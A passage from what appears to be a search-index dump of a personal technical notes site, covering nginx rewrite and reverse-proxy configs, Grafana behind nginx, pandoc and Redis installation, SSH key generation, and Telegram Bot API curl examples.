class=\"note-title\"\u003e\u003cspan\u003erewrite\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"1\"\u003e1\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://localhost/img/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/img\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;^/img/(.*)\u003c/span\u003e$\u0026#39; \u003cspan style=\"color:#e6db74\"\u003e/static/\u003c/span\u003e$1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/static\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginxconfig.io/src\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enginx.svg\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"2\"\u003e2\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://localhost/photo/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/photo\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginxconfig.io/src\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etry_files\u003c/span\u003e $uri \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e$uri \u003cspan style=\"color:#e6db74\"\u003e@pic\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@pic\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;^/photo/(.*)\u003c/span\u003e$\u0026#39; \u003cspan style=\"color:#e6db74\"\u003e/static/\u003c/span\u003e$1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"3\"\u003e3\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# remove prefix path and allow proxy_pass POST\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/upload/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Remove path\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e^/upload/(.*)\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e$1  \u003cspan style=\"color:#e6db74\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://logo\u003c/span\u003e$uri$is_args$args;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Proxy_pass POST\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_http_version\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;upgrade\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_cache_bypass\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#proxy_redirect  https://logo/ /;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eindex.html\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.htm\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egrafana behind nginx\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"serversslconf\"\u003eserver/ssl.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_certificate\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/go2cloudten.com.crt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/go2cloudten.com.key\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ciphers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"serverproxyconf\"\u003eserver/proxy.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"grafanaconf\"\u003egrafana.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e       \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003egrafana-test.go2cloudten.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003egrafana.go2cloudten.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eserver/ssl.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eserver/proxy.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/grafana.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/grafana.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003ehttp://grafana\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_connect_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_read_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e700\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_send_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e700\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Upgrade\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Nginx docs"},{"categories":null,"contents":" texlive macOS # brew install textlive # npm i -g mermaid-filter # Render mermaid pandoc -F mermaid-filter -o readme.pdf readme.md Ubuntu # sudo apt install pandoc -y # sudo apt-get -y install texlive-latex-recommended texlive-pictures texlive-latex-extra texlive-fonts-recommended # npm i -g mermaid-filter pandoc -F mermaid-filter -o readme.pdf readme.md ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/pandoc/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etexlive\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003emacOS\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# brew install textlive\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# npm i -g mermaid-filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Render mermaid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epandoc -F mermaid-filter -o readme.pdf readme.md\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eUbuntu\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sudo apt install pandoc -y\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sudo apt-get -y install texlive-latex-recommended texlive-pictures texlive-latex-extra texlive-fonts-recommended\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# npm i -g mermaid-filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epandoc -F mermaid-filter -o readme.pdf readme.md\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Pandoc Command"},{"categories":null,"contents":" Install # Ubuntu22.04 sudo add-apt-repository ppa:redislabs/redis sudo apt install redis-server ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/redis/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eInstall\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Ubuntu22.04\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo add-apt-repository ppa:redislabs/redis\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install redis-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Redis Install Command"},{"categories":null,"contents":" Generate ssh key # RSA ssh-keygen -m PEM -t rsa -b 4096 -C \u0026#34;zeyanlin@outlook.com\u0026#34; # ED25519 ssh-keygen -t ed25519 -C \u0026#34;dev\u0026#34; -f ~/.ssh/ed25519 ssh config Host private.example.com ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/ssh/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate ssh key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# RSA\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh-keygen -m PEM -t rsa -b \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e -C \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;zeyanlin@outlook.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ED25519\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh-keygen -t ed25519 -C \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dev\u0026#34;\u003c/span\u003e -f ~/.ssh/ed25519\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003essh config\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-sshconfig\" data-lang=\"sshconfig\"\u003eHost private.example.com\n  ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"SSH Command"},{"categories":null,"contents":" getUpdates curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/getUpdates\u0026#39; | jq . sendMessage # chat curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026#39; # thread curl \u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026amp;message_thread_id=14\u0026#39; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/telegram/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egetUpdates\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan 